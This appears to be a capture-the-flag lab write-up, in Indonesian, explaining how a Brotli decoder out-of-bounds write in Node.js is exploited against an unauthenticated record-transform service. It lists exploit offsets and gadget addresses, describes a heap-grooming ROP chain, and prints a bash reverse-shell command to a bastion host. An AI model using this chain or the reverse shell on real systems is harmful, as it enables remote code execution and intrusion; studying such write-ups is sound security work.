# Record Keeper (User) — Analisis

[← Overview](17-record-keeper-user.md) · [Index](index.md)

### 2.1 Wire protocol `record-transform`

Dari dokumentasi console:

```text
frame  = [ length : u32be ][ body : bytes ]
probe  = 00 00 00 00        -> PONG
non-empty body              -> ACK / ERR PROTOCOL
record = 0x330 bytes (fixed-size normalized output)
```

Setiap koneksi mengirim satu atau lebih frame. Frame kosong adalah liveness
probe. Frame non-kosong dikirim ke Brotli decoder di dalam Worker. Service
tidak punya autentikasi; siapa pun yang bisa mencapai port 3000 bisa mengirim
stream Brotli arbitrer.

`probe23.py` di workspace memakai framing yang sama:

```python
import socket, struct, brotli, zlib

def send(body, t=3):
    s = socket.create_connection((HOST, PORT), timeout=t)
    s.settimeout(t)
    s.sendall(struct.pack('>I', len(body)) + body)
    ...
```

### 2.2 CVE-2026-111497 — Node2Shell

CVE-2026-111497 adalah out-of-bounds write di decoder Brotli yang dibundel
Node.js. Akar masalahnya:

- Brotli stream bisa mendeklarasikan tipe block dan meminta block switch.
- `DecodeBlockTypeAndLength` mengembalikan `BROTLI_BOOL`, yang memakai
  `BROTLI_FALSE` untuk dua arti berbeda: "stream invalid" dan "butuh input".
- Pada stream yang hanya punya satu tipe block, block switch adalah ilegal.
  Decoder versi rentan memperlakukan `BROTLI_FALSE` sebagai "butuh input",
  bukan format error.
- Decoder lanjut dengan state invalid dan menulis melewati buffer internal
  8 byte.

Dampaknya: crash, memory disclosure, atau RCE dengan privilege proses Node.js.
Node.js memperbaiki ini di 22.23.4 / 24.22.1 / 26.12.1. Aplikasi terekspos
jika memanggil `zlib.brotliDecompress()` / `createBrotliDecompress()` pada input
attacker, atau memakai `fetch()` yang otomatis mendekode response Brotli.

### 2.3 Kenapa lab ini cocok dengan profile publik

Notes mencatat service `:3000` adalah fixture "worker record transform" yang
sama dengan lab publik:

```text
Node.js v24.9.0
zlib.createBrotliDecompress({chunkSize: 0x330})
Buffer.allocUnsafeSlow(0x330)
satu Worker per koneksi
UV_THREADPOOL_SIZE=1
```

Empat properti itu membuat layout heap deterministik:

- `chunkSize 0x330` dan `allocUnsafeSlow(0x330)` menentukan ukuran alokasi
  yang bertabrakan dengan buffer decoder.
- Satu Worker per koneksi membuat urutan alokasi bisa diatur dengan koneksi
  "groom" dan "poison".
- `UV_THREADPOOL_SIZE=1` mengurangi variasi thread yang menangani decode.
- Binary Node non-PIE + glibc bookworm memberi offset stabil.

Profile exploit:

```text
node-24.9.0-worker-record-rce-bookworm-x86_64
node_binary_sha256 : 3dc61cdcc38781a678b31903d2f69ed16094206e2258df53a4eb2c0fe4f0a793
bss_payload        : 0x6e948a0
callback_gadget    : 0x1062840
execvp_plt         : 0xf3ed60
tcache_index       : 50
state_heap_minus_ring : -0x800ab70
```

### 2.4 Alur RCE

Exploit membuka dua koneksi:

1. **Groom connection** — membentuk heap layout dan menaruh data di ring
   buffer.
2. **Poison connection** — mengirim stream Brotli malformed yang memicu OOB
   write.

OOB write menimpa saved return address di stack Worker. Stack pivot
mengarahkan eksekusi ke ROP chain yang sudah disiapkan di ring buffer. ROP
chain memanggil `execvp("/bin/bash", ["-c", <RCE_CMD>])`. Command yang dipakai
di notes membuka reverse shell ke bastion:

```bash
id;exec 4<>/dev/tcp/10.10.20.10/4445;bash -i <&4 >&4 2>&4
```

Exploit juga mengirim token acak + output `id` ke callback sebagai bukti RCE.

### 2.5 Setelah RCE

Shell berjalan sebagai `node`. File flag:

```text
/home/node/user.txt
size   : 37 bytes
mode   : 0400
owner  : node
```

Hanya ada satu user flag dan satu root flag di target:

```text
/home/node/user.txt
/root/root.txt
```

Tidak diperlukan privesc untuk challenge User: begitu RCE sebagai `node`
didapat, `/home/node/user.txt` bisa dibaca langsung (mode 0400, owner `node`).
Privesc ke root adalah challenge terpisah (`record-keeper-root.md`).
